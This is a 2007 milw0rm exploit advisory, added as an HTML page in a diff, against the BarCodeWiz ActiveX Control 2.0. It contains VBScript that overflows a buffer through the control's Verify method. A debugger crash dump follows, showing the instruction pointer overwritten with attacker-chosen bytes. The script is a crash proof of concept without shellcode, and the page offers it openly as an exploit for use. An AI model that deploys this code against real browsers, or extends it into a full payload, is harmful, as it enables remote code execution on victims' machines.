@@ -1,0 +1,67 @@
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/09</b></p></span>
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">--------------------------------------------------------------------------------
+ <b>BarCodeWiz ActiveX Control 2.0 (BarcodeWiz.dll) Remote Buffer Overflow Exploit</b>
+ url: http://www.barcodewiz.com/
+ price: from $139 to $2,350
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ Tested on Windows XP Professional SP2 full patched
+--------------------------------------------------------------------------------
+<object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='test'></object>
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the LockModules test" style="WIDTH: 350px; HEIGHT: 25px" size=20>
+<script language = 'vbscript'>
+Sub tryMe
+buff = String(1032,"A")
+
+get_EAX = "aaaa"
+
+buff2 = String(1132,"A")
+
+get_EIP = "bbbb"
+
+egg = buff + get_EAX + buff2 + get_EIP + buff
+
+test.Verify egg
+End Sub
+</script>
+faultmon dump:
+
+14:39:21.000  pid=1244 tid=1534  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [61616239])
+              ----------------------------------------------------------------
+              EAX=61616161: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=03558474: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
+              ECX=01D1E375: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
+              EDX=01D1F020: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+              ESP=01D1F014: 00 00 00 00 1C 0A 57 03-70 1B EB 03 41 41 41 41
+              EBP=01D1F420: 41 41 41 41 41 41 41 41-61 61 61 61 41 41 41 41
+              ESI=770F4C3B: 8B FF 55 8B EC 8B 45 08-85 C0 74 05 8B 40 FC D1
+              EDI=01D1F010: 7C 9E 55 03 00 00 00 00-1C 0A 57 03 70 1B EB 03
+              EIP=03E9F9C6: 8B 88 D8 00 00 00 52 8B-01 FF 50 0C 85 C0 8B 45
+                            --> MOV ECX,[EAX+000000D8]
+              ----------------------------------------------------------------
+
+14:39:21.000  pid=1244 tid=1534  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [62626262])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=62626262: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
+              ESP=01D1EC44: BF 37 91 7C 2C ED D1 01-94 F8 D1 01 48 ED D1 01
+              EBP=01D1EC64: 14 ED D1 01 8B 37 91 7C-2C ED D1 01 94 F8 D1 01
+              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EIP=62626262: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-09]
